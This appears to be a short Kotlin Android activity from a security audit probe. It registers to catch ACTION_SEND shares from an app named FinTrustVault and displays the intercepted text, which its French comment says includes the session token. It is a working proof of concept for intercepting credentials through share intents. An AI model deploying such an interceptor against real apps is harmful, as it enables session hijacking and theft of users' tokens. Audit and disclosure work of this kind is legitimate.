package com.audit.probe

import android.content.Intent
import android.os.Bundle
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

/**
 * V4 — Capte le partage ACTION_SEND envoyé par FinTrustVault et affiche
 * le texte reçu, jeton de session inclus.
 */
class InterceptActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val texteRecu = intent.getStringExtra(Intent.EXTRA_TEXT) ?: ""
        val vue = TextView(this)
        vue.setPadding(40, 80, 40, 40)
        vue.text = "Contenu intercepté :\n\n$texteRecu"
        setContentView(vue)
    }
}
